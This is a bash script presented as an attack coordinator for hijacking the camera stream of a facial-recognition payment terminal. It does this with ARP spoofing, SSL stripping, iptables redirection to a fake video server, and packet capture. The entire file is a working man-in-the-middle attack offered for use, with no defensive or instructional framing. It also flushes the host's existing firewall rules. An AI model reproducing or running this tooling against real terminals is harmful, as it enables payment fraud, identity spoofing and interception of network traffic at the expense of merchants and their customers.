#!/bin/bash

# Facial Payment Video Stream Hijacking Attack Coordinator (HTTPS Support)

# Check parameters
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_terminal_ip> <host_ip>"
    exit 1
fi

TARGET_IP=$1
HOST_IP=$2
INTERFACE=$(ip route | grep default | awk '{print $5}')
GATEWAY=$(ip route | grep default | awk '{print $3}')
LOCAL_IP=$(hostname -I | awk '{print $1}')

# Use /tmp directory for logs to avoid permission issues
LOG_DIR="/tmp/facial-attack-logs"
sudo mkdir -p $LOG_DIR
sudo chmod 777 $LOG_DIR

echo "============================================="
echo "   Facial Payment System Video Hijack (HTTPS)"
echo "============================================="
echo "Target Terminal IP: $TARGET_IP"
echo "Host IP: $HOST_IP"
echo "Local IP: $LOCAL_IP"
echo "Network Interface: $INTERFACE"
echo "============================================="

# Confirm fake video server is running
echo "Checking fake video server..."
if ! curl -s http://localhost:8080 > /dev/null; then
    echo "Error: Fake video server not running, attempting to start..."
    python3 https-fake-video-server.py > $LOG_DIR/fake_server.log 2>&1 &
    sleep 3
    
    # Check again
    if ! curl -s http://localhost:8080 > /dev/null; then
        echo "Error: Cannot start fake video server, please start it manually"
        echo "Command: python3 https-fake-video-server.py"
        exit 1
    fi
fi
echo "Fake video server is running"

# Setup network environment
echo "Setting up network environment..."

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Disable ICMP redirects
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0

# Ensure network interface is in promiscuous mode
sudo ip link set $INTERFACE promisc on

# Clear existing iptables rules
echo "Clearing existing iptables rules..."
sudo iptables -F
sudo iptables -t nat -F

# Setup sslstrip
SSL_STRIP=false
if command -v sslstrip &> /dev/null; then
    echo "Found sslstrip, configuring SSL stripping..."
    sslstrip -l 8443 -a > $LOG_DIR/sslstrip.log 2>&1 &
    SSLSTRIP_PID=$!
    echo "SSL stripping process ID: $SSLSTRIP_PID"
    SSL_STRIP=true
else
    echo "sslstrip not installed, using direct redirection only"
fi

# Setup redirection rules
echo "Setting up traffic redirection rules..."

# Redirect HTTP traffic
sudo iptables -t nat -A PREROUTING -p tcp -s $TARGET_IP -d $HOST_IP --dport 5000 -j DNAT --to-destination $LOCAL_IP:8080
echo "HTTP traffic: $TARGET_IP->$HOST_IP:5000 => $LOCAL_IP:8080"

# Redirect HTTPS traffic
if [ "$SSL_STRIP" = true ]; then
    # Using sslstrip method
    sudo iptables -t nat -A PREROUTING -p tcp -s $TARGET_IP -d $HOST_IP --dport 443 -j REDIRECT --to-port 8443
    echo "HTTPS traffic: $TARGET_IP->$HOST_IP:443 => sslstrip:8443"
else
    # Direct HTTPS traffic redirection
    sudo iptables -t nat -A PREROUTING -p tcp -s $TARGET_IP -d $HOST_IP --dport 5443 -j DNAT --to-destination $LOCAL_IP:8443
    echo "HTTPS traffic: $TARGET_IP->$HOST_IP:5443 => $LOCAL_IP:8443"
fi

# Add POSTROUTING rule to ensure packets return correctly
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

echo "Traffic redirection rules established"

# Start ARP spoofing
echo "Starting ARP spoofing..."
sudo arpspoof -i $INTERFACE -t $TARGET_IP $HOST_IP > $LOG_DIR/arpspoof1.log 2>&1 &
ARP_PID1=$!
sudo arpspoof -i $INTERFACE -t $HOST_IP $TARGET_IP > $LOG_DIR/arpspoof2.log 2>&1 &
ARP_PID2=$!
echo "ARP spoofing process IDs: $ARP_PID1, $ARP_PID2"

# Start traffic monitoring
echo "Starting traffic monitoring..."
sudo tcpdump -i $INTERFACE "(host $TARGET_IP) and (tcp port 5000 or tcp port 5443 or tcp port 443)" -n > $LOG_DIR/traffic.log 2>&1 &
TCPDUMP_PID=$!
echo "Traffic monitoring process ID: $TCPDUMP_PID"

echo "Attack coordination complete!"
echo "Video stream hijacking (HTTPS version) in progress..."
echo "Press Ctrl+C to stop the attack"

# Cleanup function
cleanup() {
    echo "Stopping attack..."
    
    if [ "$SSL_STRIP" = true ]; then
        sudo kill $SSLSTRIP_PID 2>/dev/null
    fi
    
    sudo kill $ARP_PID1 $ARP_PID2 $TCPDUMP_PID 2>/dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo ip link set $INTERFACE -promisc
    
    echo "Attack stopped!"
    exit 0
}

# Register cleanup function
trap cleanup INT TERM

# Periodically check attack component status
while true; do
    # Check ARP spoofing processes
    if ! ps -p $ARP_PID1 > /dev/null; then
        echo "Restarting ARP spoofing process 1..."
        sudo arpspoof -i $INTERFACE -t $TARGET_IP $HOST_IP > $LOG_DIR/arpspoof1.log 2>&1 &
        ARP_PID1=$!
    fi
    
    if ! ps -p $ARP_PID2 > /dev/null; then
        echo "Restarting ARP spoofing process 2..."
        sudo arpspoof -i $INTERFACE -t $HOST_IP $TARGET_IP > $LOG_DIR/arpspoof2.log 2>&1 &
        ARP_PID2=$!
    fi
    
    # Check SSL stripping process
    if [ "$SSL_STRIP" = true ] && ! ps -p $SSLSTRIP_PID > /dev/null; then
        echo "Restarting SSL stripping process..."
        sslstrip -l 8443 -a > $LOG_DIR/sslstrip.log 2>&1 &
        SSLSTRIP_PID=$!
    fi
    
    # Check fake server
    if ! curl -s -k -m 2 http://localhost:8080 > /dev/null; then
        echo "HTTP fake server has stopped, attempting to restart..."
        python3 https-fake-video-server.py > $LOG_DIR/fake_server.log 2>&1 &
        sleep 3
    fi
    
    # Check traffic status
    TRAFFIC_COUNT=$(grep -c "TCP" $LOG_DIR/traffic.log 2>/dev/null)
    echo "Captured $TRAFFIC_COUNT TCP packets"
    
    # Display attack status summary
    HTTP_HITS=$(grep -c "GET /video_feed" $LOG_DIR/fake_server.log 2>/dev/null)
    HTTPS_HITS=$(grep -c "HTTPS fake video server" $LOG_DIR/fake_server.log 2>/dev/null)
    
    echo "Attack status: HTTP requests $HTTP_HITS | HTTPS requests $HTTPS_HITS"
    echo "---------------------------------------------------"
    
    sleep 10
done
